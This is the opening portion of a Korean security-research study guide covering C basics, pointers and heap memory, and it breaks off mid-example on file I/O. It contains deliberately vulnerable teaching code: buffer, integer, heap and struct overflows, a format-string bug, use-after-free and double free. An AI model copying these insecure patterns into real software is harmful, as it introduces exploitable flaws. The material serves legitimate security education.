# 보안 연구자를 위한 완전 학습 가이드
# From Zero to Security Researcher

> 이 문서는 대학 CS 4년 과정 + 보안 전문 교육을 하나의 파일에 담은 것입니다.
> 2회독하면 중급 수준의 이해에 도달할 수 있도록 설계되었습니다.
> 모르는 부분은 건너뛰지 말고 천천히 반복하세요.

---

# 목차

1. [C 프로그래밍 기초](#1-c-프로그래밍-기초)
2. [C 프로그래밍 중급 — 포인터와 메모리](#2-c-프로그래밍-중급--포인터와-메모리)
3. [C 프로그래밍 고급 — 동적 메모리와 자료구조](#3-c-프로그래밍-고급--동적-메모리와-자료구조)
4. [C++ 핵심 개념](#4-c-핵심-개념)
5. [컴퓨터 구조 — 하드웨어 기초](#5-컴퓨터-구조--하드웨어-기초)
6. [컴퓨터 구조 — CPU 심화](#6-컴퓨터-구조--cpu-심화)
7. [운영체제 — 프로세스와 메모리](#7-운영체제--프로세스와-메모리)
8. [운영체제 — 커널과 시스템콜](#8-운영체제--커널과-시스템콜)
9. [ARM 어셈블리 기초](#9-arm-어셈블리-기초)
10. [ARM 어셈블리 심화](#10-arm-어셈블리-심화)
11. [x86-64 어셈블리 기초](#11-x86-64-어셈블리-기초)
12. [리버스 엔지니어링 기초](#12-리버스-엔지니어링-기초)
13. [리버스 엔지니어링 실전](#13-리버스-엔지니어링-실전)
14. [취약점 유형 완전 분석](#14-취약점-유형-완전-분석)
15. [Exploit 개발 기초](#15-exploit-개발-기초)
16. [Exploit 개발 심화](#16-exploit-개발-심화)
17. [최신 보호 기법과 우회](#17-최신-보호-기법과-우회)
18. [iOS 내부 구조](#18-ios-내부-구조)
19. [Android 내부 구조](#19-android-내부-구조)
20. [실전 CTF 풀이 가이드](#20-실전-ctf-풀이-가이드)
21. [종합 실습 문제](#21-종합-실습-문제)

---

# 1. C 프로그래밍 기초

## 1.1 C 언어란?

C는 1972년 Dennis Ritchie가 만든 프로그래밍 언어입니다.
운영체제(Linux, Windows, macOS), 임베디드 시스템, 게임 엔진 등 "하드웨어에 가까운" 소프트웨어를 만들 때 사용됩니다.

**왜 보안 연구에 C가 필수인가:**
- iOS 커널(XNU), Linux 커널, Windows 커널 → 전부 C로 작성됨
- 취약점의 80%+ 가 C/C++의 메모리 관리 실수에서 발생
- C를 이해해야 어셈블리 코드가 읽힘
- C를 이해해야 취약점이 "왜" 발생하는지 알 수 있음

**Python/JavaScript와의 결정적 차이:**
```
Python:  x = "hello"  → 메모리? 알아서 관리됨. 신경 쓸 필요 없음
C:       char *x = malloc(6); strcpy(x, "hello"); free(x);
         → 메모리를 직접 할당하고, 직접 해제해야 함
         → 실수하면 → 취약점 발생
```

## 1.2 개발 환경 설정

**Linux (추천):**
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install gcc gdb build-essential

# 확인
gcc --version
```

**Windows:**
```
1. WSL2 설치 (Windows Subsystem for Linux)
   → PowerShell 관리자: wsl --install
2. Ubuntu 설치 후 위의 Linux 명령어 실행
   
또는
1. MinGW 설치 → gcc 사용 가능
```

**컴파일하고 실행하기:**
```bash
# 코드 작성
nano hello.c

# 컴파일 (소스코드 → 실행파일 변환)
gcc hello.c -o hello

# 실행
./hello
```

## 1.3 첫 번째 프로그램

```c
#include <stdio.h>    // 표준 입출력 라이브러리 포함

int main() {          // 프로그램 시작점 (entry point)
    printf("Hello, World!\n");  // 화면에 출력
    return 0;         // 프로그램 정상 종료 (0 = 성공)
}
```

**한 줄씩 해석:**

| 코드 | 의미 |
|------|------|
| `#include <stdio.h>` | "printf 함수를 쓸 거니까 해당 라이브러리를 포함해라" |
| `int main()` | 프로그램의 시작 함수. OS가 이 함수를 호출하면서 프로그램이 시작됨 |
| `printf(...)` | 화면에 텍스트를 출력하는 함수 |
| `\n` | 줄바꿈 문자 (newline) |
| `return 0` | OS에게 "정상 종료"를 알림. 0이 아닌 값 = 에러 |

## 1.4 변수와 데이터 타입

변수는 **메모리에 이름을 붙인 저장 공간**입니다.

```c
#include <stdio.h>

int main() {
    // 정수형
    int age = 25;              // 4바이트, -2,147,483,648 ~ 2,147,483,647
    short small = 100;         // 2바이트, -32,768 ~ 32,767
    long big = 1000000L;       // 8바이트 (64비트 시스템)
    
    // 부호 없는 정수 (양수만)
    unsigned int positive = 42;  // 4바이트, 0 ~ 4,294,967,295
    
    // 문자형
    char letter = 'A';         // 1바이트, 실제로는 숫자 65 (ASCII)
    
    // 실수형
    float pi = 3.14f;          // 4바이트, 소수점 약 7자리 정밀도
    double precise = 3.141592653589793;  // 8바이트, 약 15자리 정밀도
    
    printf("나이: %d\n", age);
    printf("문자: %c (ASCII: %d)\n", letter, letter);
    printf("파이: %f\n", pi);
    printf("크기: int=%lu, char=%lu, double=%lu 바이트\n",
           sizeof(int), sizeof(char), sizeof(double));
    
    return 0;
}
```

**메모리에서 실제로 어떻게 저장되는가:**
```
변수 선언: int x = 305419896;  (16진수로 0x12345678)

메모리 주소:  0x1000  0x1001  0x1002  0x1003
저장된 값:   [0x78]  [0x56]  [0x34]  [0x12]
              ↑ 낮은 바이트가 낮은 주소에 (Little-Endian)

x86/ARM 계열은 Little-Endian:
  사람이 읽는 순서: 12 34 56 78
  메모리 저장 순서: 78 56 34 12 (뒤집힘!)

이것을 이해하는 것이 나중에 exploit 작성 시 매우 중요합니다.
```

**보안 관점에서 중요한 것 — Integer Overflow:**
```c
#include <stdio.h>

int main() {
    unsigned short x = 65535;   // unsigned short 최댓값
    printf("x = %u\n", x);      // 65535
    
    x = x + 1;                  // 오버플로우!
    printf("x + 1 = %u\n", x);  // 0 (!!)
    
    // 왜 위험한가:
    unsigned short length = 65530;
    unsigned short total = length + 10;  // 65540? 아니, 4!
    char buffer[total];  // 4바이트만 할당
    // 여기에 65530바이트를 쓰면 → 버퍼 오버플로우!
    
    return 0;
}
```

## 1.5 연산자

```c
#include <stdio.h>

int main() {
    // 산술 연산자
    int a = 10, b = 3;
    printf("%d + %d = %d\n", a, b, a + b);    // 13
    printf("%d - %d = %d\n", a, b, a - b);    // 7
    printf("%d * %d = %d\n", a, b, a * b);    // 30
    printf("%d / %d = %d\n", a, b, a / b);    // 3 (정수 나눗셈!)
    printf("%d %% %d = %d\n", a, b, a % b);   // 1 (나머지)
    
    // 비트 연산자 (보안에서 매우 중요!)
    unsigned char x = 0b11001010;  // 202
    unsigned char y = 0b10110101;  // 181
    
    printf("AND: %d\n", x & y);   // 10000000 = 128
    printf("OR:  %d\n", x | y);   // 11111111 = 255
    printf("XOR: %d\n", x ^ y);   // 01111111 = 127
    printf("NOT: %d\n", ~x);      // 00110101 = 53 (반전)
    printf("<<:  %d\n", x << 1);  // 왼쪽 시프트 (곱하기 2 효과)
    printf(">>:  %d\n", x >> 1);  // 오른쪽 시프트 (나누기 2 효과)
    
    // XOR의 특별한 성질 (암호학의 기초):
    // A ^ B ^ B = A  (같은 값으로 두 번 XOR하면 원래 값)
    unsigned char secret = 42;
    unsigned char key = 0xFF;
    unsigned char encrypted = secret ^ key;   // 암호화
    unsigned char decrypted = encrypted ^ key; // 복호화
    printf("원본: %d, 암호화: %d, 복호화: %d\n",
           secret, encrypted, decrypted);  // 42, 213, 42
    
    return 0;
}
```

**비트 연산이 보안에서 중요한 이유:**
```
1. 암호화 알고리즘의 기본 연산 (AES, ChaCha20 등)
2. 해시 함수 (SHA-256 등)
3. 메모리 주소 조작 (ASLR 우회 시)
4. 플래그/권한 확인 (파일 권한, CPU 플래그)
5. 네트워크 패킷 파싱 (서브넷 마스크 등)
```

## 1.6 조건문과 반복문

```c
#include <stdio.h>

int main() {
    // if-else
    int score = 85;
    
    if (score >= 90) {
        printf("A등급\n");
    } else if (score >= 80) {
        printf("B등급\n");
    } else {
        printf("C등급 이하\n");
    }
    
    // switch (특정 값 비교 시 깔끔)
    char grade = 'B';
    switch (grade) {
        case 'A':
            printf("우수\n");
            break;          // break 없으면 아래로 계속 실행 (fall-through)
        case 'B':
            printf("양호\n");
            break;
        default:
            printf("기타\n");
    }
    
    // for 반복
    for (int i = 0; i < 5; i++) {
        printf("반복 %d\n", i);  // 0, 1, 2, 3, 4
    }
    
    // while 반복
    int count = 10;
    while (count > 0) {
        printf("%d ", count);
        count--;
    }
    printf("발사!\n");
    
    // do-while (최소 1번 실행)
    int input;
    do {
        printf("1~10 사이 숫자 입력: ");
        scanf("%d", &input);
    } while (input < 1 || input > 10);
    
    return 0;
}
```

## 1.7 함수

```c
#include <stdio.h>

// 함수 선언 (프로토타입) — 컴파일러에게 "이런 함수가 있을 거야"라고 알림
int add(int a, int b);
void print_binary(unsigned char value);

int main() {
    int result = add(3, 5);
    printf("3 + 5 = %d\n", result);
    
    print_binary(42);   // 00101010
    print_binary(255);  // 11111111
    
    return 0;
}

// 함수 정의
int add(int a, int b) {
    return a + b;
}

// 바이트를 2진수로 출력하는 함수 (비트 연산 연습)
void print_binary(unsigned char value) {
    for (int i = 7; i >= 0; i--) {
        printf("%d", (value >> i) & 1);
    }
    printf(" (%d)\n", value);
}
```

**함수 호출 시 메모리에서 일어나는 일 (매우 중요!):**
```
main()이 add(3, 5)를 호출할 때:

    높은 주소
    ┌─────────────────┐
    │  main의 지역변수   │
    │  result = ?       │
    ├─────────────────┤ ← main의 스택 프레임
    │  복귀 주소         │  ← add 끝나면 돌아갈 main의 주소
    │  이전 프레임 포인터  │  ← 이전 스택 프레임의 위치
    ├─────────────────┤ ← add의 스택 프레임
    │  a = 3            │
    │  b = 5            │
    │  (반환값 = 8)      │
    └─────────────────┘
    낮은 주소

    "복귀 주소"를 덮어쓸 수 있으면 → 프로그램 흐름 장악
    이것이 Buffer Overflow 공격의 핵심!
```

## 1.8 배열

```c
#include <stdio.h>
#include <string.h>

int main() {
    // 정수 배열
    int numbers[5] = {10, 20, 30, 40, 50};
    
    // 인덱스는 0부터 시작!
    printf("첫 번째: %d\n", numbers[0]);   // 10
    printf("세 번째: %d\n", numbers[2]);   // 30
    
    // 배열 순회
    for (int i = 0; i < 5; i++) {
        printf("numbers[%d] = %d\n", i, numbers[i]);
    }
    
    // 문자열 = char 배열 + 널 종료 문자('\0')
    char name[6] = {'H', 'e', 'l', 'l', 'o', '\0'};
    // 또는 간단하게:
    char name2[] = "Hello";  // 컴파일러가 자동으로 '\0' 추가
    
    printf("이름: %s\n", name);
    printf("길이: %lu\n", strlen(name));  // 5 ('\0' 제외)
    printf("배열 크기: %lu\n", sizeof(name));  // 6 ('\0' 포함)
    
    // 메모리에서:
    // name: ['H']['e']['l']['l']['o']['\0']
    //        0    1    2    3    4    5
    
    // 위험한 코드 — 범위 밖 접근
    // int arr[3] = {1, 2, 3};
    // printf("%d\n", arr[100]);  // 정의되지 않은 동작!
    // C는 범위 검사를 하지 않음 → 취약점의 원인
    
    return 0;
}
```

**보안 관점 — 배열 범위 검사 없음:**
```c
// 이것이 Buffer Overflow의 근본 원인
char buffer[10];
char input[] = "This is way too long for the buffer!!!";

strcpy(buffer, input);  // buffer 크기를 확인하지 않고 복사!
// buffer 뒤의 메모리까지 덮어씀
// 그 뒤에 복귀 주소가 있으면? → 프로그램 흐름 장악

// 안전한 코드:
strncpy(buffer, input, sizeof(buffer) - 1);
buffer[sizeof(buffer) - 1] = '\0';  // 널 종료 보장
```

## 1.9 문자열 처리

```c
#include <stdio.h>
#include <string.h>

int main() {
    char str1[50] = "Hello";
    char str2[] = "World";
    
    // 문자열 길이
    printf("길이: %lu\n", strlen(str1));  // 5
    
    // 문자열 복사
    char dest[50];
    strcpy(dest, str1);        // 위험! 크기 확인 안 함
    strncpy(dest, str1, 49);   // 안전: 최대 49바이트만 복사
    dest[49] = '\0';
    
    // 문자열 연결
    strcat(str1, " ");
    strcat(str1, str2);
    printf("연결: %s\n", str1);  // "Hello World"
    
    // 문자열 비교
    if (strcmp("abc", "abc") == 0) {
        printf("같음\n");
    }
    // strcmp 반환값: 0이면 같음, 양수면 첫 번째가 큼, 음수면 두 번째가 큼
    
    // 문자열 검색
    char *found = strstr("Hello World", "World");
    if (found != NULL) {
        printf("발견: %s\n", found);  // "World"
    }
    
    // 포맷 문자열 (printf의 형식 지정자)
    printf("정수: %d\n", 42);
    printf("16진수: 0x%x\n", 255);     // 0xff
    printf("16진수(대문자): 0x%X\n", 255);  // 0xFF
    printf("8진수: %o\n", 255);         // 377
    printf("문자: %c\n", 65);           // A
    printf("문자열: %s\n", "hello");
    printf("포인터: %p\n", str1);       // 메모리 주소
    printf("부동소수: %f\n", 3.14);
    printf("패딩: [%10d]\n", 42);       // [        42]
    printf("왼쪽정렬: [%-10d]\n", 42);   // [42        ]
    
    return 0;
}
```

**보안 취약점 — Format String Attack:**
```c
// 위험한 코드:
char user_input[100];
scanf("%s", user_input);
printf(user_input);        // 사용자 입력을 직접 포맷 문자열로 사용!

// 사용자가 "%x %x %x %x"를 입력하면?
// → 스택의 값들이 16진수로 출력됨 (정보 유출!)

// 사용자가 "%n"을 입력하면?
// → 메모리에 값을 쓸 수 있음! (임의 쓰기!)

// 안전한 코드:
printf("%s", user_input);  // %s로 "문자열로만 취급"
```

## 1.10 기초 실습 문제

**문제 1: 바이트 순서 확인**
```c
// 이 프로그램의 출력은? (직접 생각한 뒤 컴파일해서 확인)
#include <stdio.h>
int main() {
    int x = 0x41424344;
    char *p = (char *)&x;
    printf("%c%c%c%c\n", p[0], p[1], p[2], p[3]);
    return 0;
}
```

<details>
<summary>정답 보기</summary>

Little-Endian 시스템에서: `DCBA`
- 0x41='A', 0x42='B', 0x43='C', 0x44='D'
- Little-Endian이므로 낮은 바이트(0x44='D')가 낮은 주소에 저장
- p[0]=0x44='D', p[1]=0x43='C', p[2]=0x42='B', p[3]=0x41='A'

Big-Endian 시스템에서는: `ABCD`

</details>

**문제 2: 오버플로우 예측**
```c
#include <stdio.h>
int main() {
    unsigned char a = 200;
    unsigned char b = 100;
    unsigned char c = a + b;
    printf("%d\n", c);
    return 0;
}
```

<details>
<summary>정답 보기</summary>

출력: `44`
- 200 + 100 = 300
- unsigned char 최대값은 255
- 300 - 256 = 44 (오버플로우로 0부터 다시 시작)
- 300 % 256 = 44

</details>

**문제 3: XOR 암복호화 구현**
```
직접 작성해보세요:
1. "SECRET"라는 문자열을 XOR 키 0xAB로 암호화
2. 암호화된 데이터를 다시 같은 키로 복호화
3. 원본과 같은지 확인
```

<details>
<summary>정답 예시</summary>

```c
#include <stdio.h>
#include <string.h>

int main() {
    char original[] = "SECRET";
    char encrypted[7];
    char decrypted[7];
    unsigned char key = 0xAB;
    int len = strlen(original);
    
    for (int i = 0; i < len; i++) {
        encrypted[i] = original[i] ^ key;
    }
    encrypted[len] = '\0';
    
    for (int i = 0; i < len; i++) {
        decrypted[i] = encrypted[i] ^ key;
    }
    decrypted[len] = '\0';
    
    printf("원본: %s\n", original);
    printf("복호화: %s\n", decrypted);
    printf("일치: %s\n", strcmp(original, decrypted) == 0 ? "YES" : "NO");
    
    return 0;
}
```

</details>

---

# 2. C 프로그래밍 중급 — 포인터와 메모리

> 포인터는 C의 가장 강력하면서도 가장 위험한 기능입니다.
> 보안 연구의 핵심이므로 완벽하게 이해해야 합니다.

## 2.1 메모리 주소의 이해

컴퓨터의 메모리(RAM)는 바이트 단위로 번호가 매겨진 거대한 배열입니다.

```
메모리를 호텔로 비유:
  - 각 방에 번호가 있음 (0x0000, 0x0001, 0x0002...)
  - 각 방에 1바이트(8비트)의 데이터를 저장할 수 있음
  - "주소"는 방 번호
  - "값"은 방 안에 있는 것

int x = 42;  라고 하면:
  호텔의 0x7FFF1000번 방부터 4개 방(4바이트)에 42라는 값이 저장됨
  
  주소:     0x7FFF1000  0x7FFF1001  0x7FFF1002  0x7FFF1003
  값:       [0x2A]      [0x00]      [0x00]      [0x00]
            (42의 little-endian 표현)
```

## 2.2 포인터 기초

**포인터 = 메모리 주소를 저장하는 변수**

```c
#include <stdio.h>

int main() {
    int x = 42;
    int *p = &x;      // p는 x의 주소를 저장
    
    printf("x의 값: %d\n", x);        // 42
    printf("x의 주소: %p\n", &x);     // 0x7ffd12345678 (매번 다름)
    printf("p의 값: %p\n", p);        // x의 주소와 동일
    printf("p가 가리키는 값: %d\n", *p); // 42 (역참조)
    
    *p = 100;          // p를 통해 x의 값을 변경
    printf("x의 새 값: %d\n", x);     // 100
    
    // 핵심 연산자:
    // &  → "주소를 알려줘" (address-of)
    // *  → "그 주소에 가서 값을 읽어/써" (dereference, 역참조)
    
    return 0;
}
```

**시각적 이해:**
```
선언: int x = 42;  int *p = &x;

메모리 상태:
  주소          이름    값
  0x1000-1003   x      42
  0x2000-2007   p      0x1000  ← x의 주소를 저장!
  
  p ---가리킴--→ x
  
  *p  = "p가 가리키는 곳의 값" = 42
  &x  = "x의 주소" = 0x1000
  p   = 0x1000 (p 자체의 값 = 주소)
  &p  = 0x2000 (p 자체의 주소)
```

## 2.3 포인터 연산

```c
#include <stdio.h>

int main() {
    int arr[5] = {10, 20, 30, 40, 50};
    int *p = arr;       // 배열 이름 = 첫 번째 원소의 주소
    
    printf("p가 가리키는 값: %d\n", *p);       // 10
    printf("p+1이 가리키는 값: %d\n", *(p+1)); // 20
    printf("p+2이 가리키는 값: %d\n", *(p+2)); // 30
    
    // p+1은 실제로 4바이트(int 크기)만큼 이동!
    printf("p의 주소: %p\n", p);       // 0x1000
    printf("p+1의 주소: %p\n", p+1);   // 0x1004 (0x1000 + 4)
    printf("p+2의 주소: %p\n", p+2);   // 0x1008 (0x1000 + 8)
    
    // 배열과 포인터의 관계:
    // arr[i]  와  *(arr + i)  는 완전히 동일
    // arr[3]  == *(arr + 3)  == *(p + 3)  == p[3]  모두 40
    
    // 포인터 증가
    p++;       // p가 다음 원소를 가리킴
    printf("p++ 후: %d\n", *p);  // 20
    
    return 0;
}
```

**메모리 시각화:**
```
int arr[5] = {10, 20, 30, 40, 50};

주소:    0x1000   0x1004   0x1008   0x100C   0x1010
값:      [  10 ]  [  20 ]  [  30 ]  [  40 ]  [  50 ]
         arr[0]   arr[1]   arr[2]   arr[3]   arr[4]
          ↑
          p (처음)
                   ↑
                   p (p++ 후)

p + 1 = 주소 + sizeof(int) = 주소 + 4
p + n = 주소 + n * sizeof(int)
```

## 2.4 포인터와 함수

```c
#include <stdio.h>

// 값에 의한 전달 (Call by Value) — 복사본이 전달됨
void bad_swap(int a, int b) {
    int temp = a;
    a = b;
    b = temp;
    // 이 함수 안에서만 바뀌고, 원본은 안 바뀜!
}

// 포인터에 의한 전달 (Call by Reference) — 주소가 전달됨
void good_swap(int *a, int *b) {
    int temp = *a;
    *a = *b;
    *b = temp;
    // 포인터를 통해 원본을 직접 수정!
}

int main() {
    int x = 10, y = 20;
    
    bad_swap(x, y);
    printf("bad_swap 후: x=%d, y=%d\n", x, y);   // x=10, y=20 (안 바뀜!)
    
    good_swap(&x, &y);
    printf("good_swap 후: x=%d, y=%d\n", x, y);  // x=20, y=10 (바뀜!)
    
    return 0;
}
```

## 2.5 포인터와 문자열

```c
#include <stdio.h>

int main() {
    // 방법 1: 배열로 문자열 (수정 가능)
    char str1[] = "Hello";
    str1[0] = 'h';     // OK — 스택에 복사본이 있음
    
    // 방법 2: 포인터로 문자열 (수정 불가!)
    char *str2 = "Hello";
    // str2[0] = 'h';  // 위험! 읽기 전용 메모리 → 크래시 (Segfault)
    
    // 문자열 수동 순회
    char *p = str1;
    while (*p != '\0') {     // 널 문자를 만날 때까지
        printf("%c", *p);
        p++;
    }
    printf("\n");
    
    // 간단한 strlen 구현
    int len = 0;
    p = str1;
    while (*p++) len++;
    printf("길이: %d\n", len);
    
    return 0;
}
```

## 2.6 이중 포인터 (포인터의 포인터)

```c
#include <stdio.h>

int main() {
    int x = 42;
    int *p = &x;       // p → x
    int **pp = &p;      // pp → p → x
    
    printf("x = %d\n", x);
    printf("*p = %d\n", *p);
    printf("**pp = %d\n", **pp);   // 두 번 역참조: pp → p → x = 42
    
    // 메모리:
    //  x (0x1000):    42
    //  p (0x2000):    0x1000   (x의 주소)
    // pp (0x3000):    0x2000   (p의 주소)
    
    // pp → p → x
    // *pp = p의 값 = 0x1000
    // **pp = *(*pp) = *(p) = x = 42
    
    return 0;
}
```

**이중 포인터는 언제 사용하나:**
- 함수 안에서 포인터 자체를 변경해야 할 때
- 문자열 배열 (char *argv[])
- 동적 2차원 배열

## 2.7 void 포인터와 타입 캐스팅

```c
#include <stdio.h>

int main() {
    int x = 42;
    float f = 3.14;
    
    // void 포인터: 어떤 타입이든 가리킬 수 있음
    void *generic = &x;
    printf("정수: %d\n", *(int *)generic);     // void*를 int*로 캐스팅
    
    generic = &f;
    printf("실수: %f\n", *(float *)generic);   // void*를 float*로 캐스팅
    
    // 타입 캐스팅의 위험 (보안 관점)
    int value = 0x41424344;
    char *char_view = (char *)&value;
    
    printf("int로 보면: %d\n", value);
    printf("char로 보면: ");
    for (int i = 0; i < 4; i++) {
        printf("%c ", char_view[i]);  // D C B A (little-endian)
    }
    printf("\n");
    
    // 이것이 Type Confusion 취약점의 기초:
    // 프로그램이 데이터의 타입을 잘못 해석하면
    // 의도하지 않은 메모리 접근이 가능
    
    return 0;
}
```

## 2.8 구조체 (struct)

```c
#include <stdio.h>
#include <string.h>

// 구조체 정의: 여러 변수를 하나로 묶음
struct User {
    char name[32];
    int age;
    int is_admin;      // 0 = 일반, 1 = 관리자
};

void print_user(struct User *u) {
    printf("이름: %s, 나이: %d, 관리자: %s\n",
           u->name, u->age, u->is_admin ? "Yes" : "No");
    // u->name  은  (*u).name  과 동일
}

int main() {
    struct User user1;
    strcpy(user1.name, "Kim");
    user1.age = 25;
    user1.is_admin = 0;
    
    print_user(&user1);
    
    // 구조체의 메모리 레이아웃 (패딩 포함)
    printf("구조체 크기: %lu\n", sizeof(struct User));
    printf("name 오프셋: %lu\n", (size_t)&((struct User *)0)->name);
    printf("age 오프셋: %lu\n", (size_t)&((struct User *)0)->age);
    printf("is_admin 오프셋: %lu\n", (size_t)&((struct User *)0)->is_admin);
    
    return 0;
}
```

**보안 관점 — 구조체 오버플로우:**
```
struct User의 메모리 레이아웃:

오프셋:  0                    32       36
         ┌────────────────────┬────────┬──────────┐
         │ name[32]           │ age    │ is_admin │
         │ "Kim\0..."         │  25    │    0     │
         └────────────────────┴────────┴──────────┘

만약 name에 32바이트보다 긴 문자열을 넣으면?
→ name 뒤의 age, is_admin까지 덮어쓸 수 있음!
→ is_admin을 1로 만들어 관리자 권한 획득 가능!

이것이 실제 취약점으로 사용된 사례가 수없이 많습니다.
```

## 2.9 포인터 실습 문제

**문제 1: 메모리 주소 추적**
```c
int a = 10;
int b = 20;
int *p = &a;
int *q = &b;

*p = *q;      // a = ?
p = q;        // p가 가리키는 곳은?
*p = 30;      // b = ?

// a, b의 최종 값은?
```

<details>
<summary>정답 보기</summary>

1. `*p = *q;` → p가 가리키는 곳(a)에 q가 가리키는 값(20)을 넣음 → a = 20
2. `p = q;` → p가 b를 가리키게 됨 (a의 값은 변하지 않음)
3. `*p = 30;` → p가 가리키는 곳(b)에 30을 넣음 → b = 30

최종: a = 20, b = 30

</details>

**문제 2: 배열 포인터**
```c
int arr[] = {5, 10, 15, 20, 25};
int *p = arr + 2;

// 다음 각각의 값은?
// *p
// *(p - 1)
// *(p + 2)
// p[-1]
// p[1]
```

<details>
<summary>정답 보기</summary>

- p = arr + 2 → arr[2]를 가리킴
- `*p` = 15 (arr[2])
- `*(p - 1)` = 10 (arr[1])
- `*(p + 2)` = 25 (arr[4])
- `p[-1]` = *(p - 1) = 10
- `p[1]` = *(p + 1) = 20

</details>

---

# 3. C 프로그래밍 고급 — 동적 메모리와 자료구조

## 3.1 스택(Stack)과 힙(Heap)

프로그램이 사용하는 메모리는 영역이 나뉘어 있습니다.

```
프로세스의 메모리 레이아웃:

높은 주소  ┌──────────────────────┐
           │   커널 영역           │  ← 사용자가 접근 불가
           ├──────────────────────┤
           │   스택 (Stack) ↓     │  ← 지역 변수, 함수 호출 정보
           │   (위에서 아래로 자람) │     자동 할당/해제
           │                      │
           │   ↕ 빈 공간           │
           │                      │
           │   힙 (Heap) ↑        │  ← malloc/free로 관리
           │   (아래에서 위로 자람) │     수동 할당/해제
           ├──────────────────────┤
           │   BSS (초기화 안 된    │  ← 전역 변수 (0으로 초기화)
           │        전역 변수)     │
           ├──────────────────────┤
           │   Data (초기화된      │  ← 전역 변수 (값이 있는)
           │         전역 변수)    │
           ├──────────────────────┤
           │   Text (코드)         │  ← 실행할 기계어 코드
낮은 주소  └──────────────────────┘     (읽기 전용)
```

**스택 vs 힙:**

| 특성 | 스택 (Stack) | 힙 (Heap) |
|------|------------|-----------|
| 할당 속도 | 매우 빠름 | 느림 |
| 해제 | 자동 (함수 끝나면) | 수동 (free 호출) |
| 크기 | 제한적 (보통 8MB) | 큰 데이터 가능 |
| 방향 | 높은 주소 → 낮은 주소 | 낮은 주소 → 높은 주소 |
| 관리 | OS/컴파일러 | 프로그래머 |
| 취약점 | Stack Overflow, BOF | Heap Overflow, UAF |

## 3.2 동적 메모리 할당

```c
#include <stdio.h>
#include <stdlib.h>    // malloc, free, calloc, realloc
#include <string.h>

int main() {
    // malloc: 메모리 할당 (초기화 안 됨 — 쓰레기 값)
    int *p = (int *)malloc(sizeof(int) * 5);  // int 5개 분량
    if (p == NULL) {
        printf("메모리 할당 실패!\n");
        return 1;
    }
    
    // 값 설정
    for (int i = 0; i < 5; i++) {
        p[i] = (i + 1) * 10;
    }
    
    // calloc: 메모리 할당 + 0으로 초기화
    int *q = (int *)calloc(5, sizeof(int));  // 모든 값이 0
    
    // realloc: 크기 변경 (기존 데이터 보존)
    p = (int *)realloc(p, sizeof(int) * 10);  // 5개 → 10개로 확장
    // 주의: realloc은 주소가 바뀔 수 있음!
    
    // 사용 후 반드시 해제
    free(p);
    p = NULL;      // 해제 후 NULL로 설정 (안전 습관)
    
    free(q);
    q = NULL;
    
    return 0;
}
```

## 3.3 메모리 관련 버그 유형 (취약점의 원천)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 버그 1: Use-After-Free (UAF) — checkm8이 이것!
void uaf_example() {
    char *data = (char *)malloc(64);
    strcpy(data, "secret password");
    
    free(data);           // 메모리 해제
    
    // data 포인터는 여전히 이전 주소를 가리킴 (dangling pointer)
    // 이 메모리가 다른 용도로 재할당될 수 있음
    
    char *new_data = (char *)malloc(64);
    // new_data가 data와 같은 주소를 받을 수 있음!
    strcpy(new_data, "attacker data");
    
    // 만약 프로그램이 아직 data를 사용한다면:
    printf("%s\n", data);   // "attacker data" 출력!
    // → 공격자가 제어하는 데이터를 프로그램이 신뢰함
    
    free(new_data);
}

// 버그 2: Double Free
void double_free_example() {
    char *p = (char *)malloc(64);
    free(p);
    // free(p);    // 같은 메모리를 두 번 해제!
    // → 힙 관리 구조가 깨짐
    // → 공격자가 힙 레이아웃을 조작할 수 있음
}

// 버그 3: Heap Buffer Overflow
void heap_overflow_example() {
    char *buf = (char *)malloc(32);
    char *important = (char *)malloc(32);
    strcpy(important, "admin=false");
    
    // buf에 32바이트보다 긴 데이터를 쓰면?
    strcpy(buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    // buf 뒤의 힙 메타데이터 + important 내용이 덮어써짐!
    
    printf("important: %s\n", important);  // 깨진 데이터!
    
    free(important);
    free(buf);
}

// 버그 4: Memory Leak (보안보다는 안정성 문제)
void memory_leak_example() {
    for (int i = 0; i < 1000000; i++) {
        char *p = (char *)malloc(1024);
        // free를 안 함!
        // 반복할수록 메모리 사용량 증가 → 결국 시스템 멈춤
    }
}

int main() {
    uaf_example();
    return 0;
}
```

## 3.4 연결 리스트 (Linked List)

힙 관리를 이해하기 위해 필수적인 자료구조입니다.

```c
#include <stdio.h>
#include <stdlib.h>

// 노드 정의
struct Node {
    int data;
    struct Node *next;    // 다음 노드를 가리키는 포인터
};

// 새 노드 생성
struct Node *create_node(int data) {
    struct Node *node = (struct Node *)malloc(sizeof(struct Node));
    node->data = data;
    node->next = NULL;
    return node;
}

// 맨 앞에 삽입
struct Node *insert_front(struct Node *head, int data) {
    struct Node *new_node = create_node(data);
    new_node->next = head;
    return new_node;
}

// 리스트 출력
void print_list(struct Node *head) {
    struct Node *current = head;
    while (current != NULL) {
        printf("[%d] -> ", current->data);
        current = current->next;
    }
    printf("NULL\n");
}

// 리스트 해제
void free_list(struct Node *head) {
    struct Node *current = head;
    while (current != NULL) {
        struct Node *next = current->next;
        free(current);
        current = next;
    }
}

int main() {
    struct Node *list = NULL;
    
    list = insert_front(list, 30);
    list = insert_front(list, 20);
    list = insert_front(list, 10);
    
    print_list(list);  // [10] -> [20] -> [30] -> NULL
    
    free_list(list);
    return 0;
}
```

**메모리에서:**
```
힙 영역:
  0x1000: [data=10 | next=0x1020]  ← head가 가리킴
  0x1020: [data=20 | next=0x1040]
  0x1040: [data=30 | next=NULL   ]
  
  힙의 free list도 이와 비슷한 연결 리스트 구조!
  → 힙 메타데이터를 조작하면 임의 주소 쓰기 가능
  → 이것이 힙 exploit의 기초
```

## 3.5 파일 입출력

```c
#include <stdio.h>

int main() {
    // 파일 쓰기
    FILE *fp = fopen("test.txt", "w");  // "w"=쓰기, "r"=읽기, "a"=추가
    if (fp == NULL) {
        perror("파일 열기 실패");
        return 1;
    }
    fprintf(fp, "Hello File!\n");
    fprintf(fp, "숫자: %d\n", 42);
    fclose(fp);
    
    // 파일 읽기
    fp = fopen("test.txt", "r");
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        printf("읽음: %s", buffer);
    }
    fclose(fp);
    
    // 바이너리 파일 (보안 분석에서 자주 사용)
    fp = fopen("binary.bin", "wb");
    unsigned char bytes[] = {0xDE, 0xAD, 0xBE, 0xEF};
    fwrite(bytes, 1, sizeof(bytes), fp);
    fclose(fp);
    
